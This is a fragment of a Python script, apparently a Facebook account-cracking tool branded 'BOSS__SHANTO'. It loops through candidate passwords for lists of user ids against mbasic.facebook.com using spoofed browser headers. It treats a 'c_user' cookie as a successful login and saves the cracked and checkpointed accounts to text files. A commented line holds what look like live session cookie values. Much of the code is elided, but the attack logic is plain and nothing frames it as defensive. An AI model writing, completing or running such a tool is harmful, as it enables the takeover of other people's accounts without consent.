...
princp=[]
try:
 prox= response = requests.get('https://mbasic.facebook.com/', cookies=cookies, headers=headers).text
...
def gml():
    ...
    os.system('clear')
    os.system('xdg-https://www.facebook.com/minhazulislam.shanto.16')
    print(logo)
    ...
    print(' [+] \033[38;5;46mIds saved in SHANTO-ok.txt,SHANTO-cp.txt')
def rcrack1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r[\033[1;92m[\033[38;5;46mBOSS__SHANTO]\033[1;97m] > [%s/%s] > [OK\033[1;97m:-\033[1;92m%s\033[1;97m] - [CP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
    ...
    # 'cookie': 'datr=dP_LZAsP9FgFtovBQDKSMygV; sb=dP_LZN5SVrHEouIATLjMCArp; vpd=v1%3B696x360x2; locale=en_GB; wl_cbv=v2%3Bclient_version%3A2321%3Btimestamp%3A1694115089; wd=980x1895; dpr=2; fr=0p0mLTCACqPEn6Qin.AWVV0T0uxptBUDaetbB4qQYijRw.Bk-LsB.D7.AAA.0.0.Bk_e60.AWWz82aFuGo',
    'dpr': '2',
    'sec-ch-prefers-color-scheme': 'dark',
    'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="116", "Google Chrome";v="116"',
    'sec-ch-ua-full-version-list': '"(Not(A:Brand";v="99.0.0.0", "Chromium";v="116.0.5802.208", "Google Chrome";v="116.0.5802.208"',
    'sec-ch-ua-mobile': '?0',
    ...
    'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5802.208 Safari/537.36',
    'viewport-width': '980', }
            ...
            if 'c_user' in log_cookies:
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\033[38;5;46m[𝘽𝙊𝙎𝙎____SHANTO] \033[38;5;46m%s\033[38;5;46m |\033[m[\033[38;5;46mOK:\033[\033[38;5;46m%s\033[38;5;46m] '%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
Main()
